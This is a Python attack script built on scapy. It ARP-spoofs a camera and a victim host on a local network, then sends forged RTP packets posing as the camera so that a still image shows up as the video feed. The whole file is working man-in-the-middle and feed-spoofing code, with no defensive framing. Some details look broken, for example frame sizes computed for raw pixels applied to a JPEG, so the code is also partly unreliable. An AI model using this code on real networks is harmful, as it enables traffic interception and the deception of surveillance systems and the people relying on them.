from PIL import Image
from scapy.all import *
import struct
import threading
import time

camera_ip = "192.168.88.115"
victim_ip = "192.168.88.110"

input_image_path = "img.jpg"
output_image_path = "img_resized.jpg"

def resize_image(image_path, output_path, size):
    with Image.open(image_path) as img:
        img = img.resize(size, Image.ANTIALIAS)
        img.save(output_path)

print("resizing")
resize_image(input_image_path, output_image_path, (1920, 1080))  
print("resizing done")

# Load resized image payload
def load_image_as_payload(image_path):
    with open(image_path, 'rb') as image_file:
        return bytearray(image_file.read())

print("doing image payload")
image_payload = load_image_as_payload(output_image_path)
print("image payload done")

frame_size = 1920 * 1080 * 3  
num_frames = len(image_payload) // frame_size

sequence_number = 0
timestamp = 0
packets = 0

# Create packets that together composes the fake image by splitting the image payload into frames
print("creating packets")
def create_rtp_packet(frame_data):
    global sequence_number, timestamp
    sequence_number += 1
    timestamp += 90  # Length of each frame in milliseconds
    rtp_header = struct.pack('!BBHII', 0x80, 96, sequence_number, timestamp, 0)  # RTP headers
    return IP(src=camera_ip, dst=victim_ip)/UDP(sport=RandShort(), dport=554)/Raw(load=rtp_header + frame_data)

def arp_spoof(target_ip, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst="ff:ff:ff:ff:ff:ff")
    send(packet, verbose=False)

def perform_arp_spoofing():
    while True:
        arp_spoof(victim_ip, camera_ip)
        arp_spoof(camera_ip, victim_ip)
        time.sleep(2)  # ARP spoof every 2 seconds

# Run spoofing in a separate thread
threading.Thread(target=perform_arp_spoofing).start()

def send_fake_video():
    global image_payload, num_frames, packets
    while True:
        for i in range(num_frames):
            frame_data = image_payload[i*frame_size:(i+1)*frame_size]
            rtp_packet = create_rtp_packet(frame_data)
            send(rtp_packet, verbose=False)
            packets = packets + 1
            time.sleep(0.0333)  
        print("packets done, amount of packets {packets}")

print("send fake image")
send_fake_video()